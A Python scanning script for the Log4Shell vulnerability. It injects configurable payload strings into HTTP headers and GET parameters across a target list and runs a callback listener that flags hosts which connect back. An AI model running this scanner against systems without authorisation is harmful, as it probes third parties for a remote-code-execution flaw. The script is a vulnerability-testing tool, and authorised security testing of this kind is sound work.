from colorama import Fore, Style
import argparse
import random
import time
from socket import *
import requests
import threading
from alive_progress import alive_bar

parser = argparse.ArgumentParser(description='Yet another log4shell testing script.')
parser.add_argument('-d', '--delay', help='Delay between every request in ms.', required=False, default=0)
args = parser.parse_args()


def srvcomponent(ip, port):
    serversocket = socket(AF_INET, SOCK_STREAM)
    serversocket.bind((ip, port))
    serversocket.listen(1)

    print(Fore.GREEN + "[+] Started back connect server on " + ip + ":" + str(port) + Style.RESET_ALL)
    print()

    while 1:
        connectionsocket, addr = serversocket.accept()
        connectionsocket.settimeout(3)
        try:
            data = connectionsocket.recv(1024)
            for i in targets:
                if str(addr[0]) in i:
                    print(Fore.GREEN + "\t[+]" + str(addr[0]) + ":" + str(data) + Style.RESET_ALL)
                    vulnerable.add(str(addr[0]))
            connectionsocket.close()
        except:
            connectionsocket.close()


back_connect_IP = ""
back_connect_PORT = 8080
injection_strings = set()
injection_points = set()
vulnerable = set()

f = open("config.cfg", "r")
configContent = f.readlines()
f.close()
f = open("targets.txt", "r")
targets = f.readlines()
f.close()
for line in configContent:
    line = line.strip()
    if "back_connect_IP" in line:
        back_connect_IP = line.split('=')[1]
    if "back_connect_PORT" in line:
        back_connect_PORT = int(line.split('=')[1])
    if "INJ_STRING" in line:
        line = line.split('INJ_STRING:')[1]
        injection_strings.add(line)
    if "INJ_POINT" in line:
        line = line.split("INJ_POINT:")[1]
        injection_points.add(line)

srv = threading.Thread(target=srvcomponent, args=(back_connect_IP, back_connect_PORT,))
srv.start()
time.sleep(2)

for target in targets:
    target = target.strip()
    print("[*] testing " + Fore.BLUE + target + Style.RESET_ALL)
    with alive_bar(len(injection_strings), title="sending requests to " + Fore.BLUE + target + Style.RESET_ALL) as bar:
        for injection_string in injection_strings:
            injection_string = injection_string.strip()
            rndEndpoint = str(random.randint(10000, 99999))
            injection_string = injection_string.replace("<RND>", rndEndpoint)
            injection_string = injection_string.replace("<IP>", back_connect_IP)
            injection_string = injection_string.replace("<PORT>", str(back_connect_PORT))
            headers = {}
            getInject = "/?"
            for item in injection_points:
                item = item.split(':')
                if item[0] == "HEADER":
                    headers[item[1]] = injection_string
                if item[0] == "GET":
                    getPara = item[1].replace("<RND>", str(random.randint(10000, 99999)))
                    getInject += getPara + "=" + injection_string + "&"
            time.sleep(float(int(args.delay)/1000))
            response = requests.get(target + getInject, headers=headers, verify=False)
            bar()
    time.sleep(2)
    print()

print("[*] All targets tested.")
if len(vulnerable) > 0:
    print("[*] The following targets seem to be vulnerable")
    for item in vulnerable:
        print(Fore.GREEN + "\t[+] " + item + Style.RESET_ALL)
print()
print("[*] Press CTRL+c to stop the script")
print()
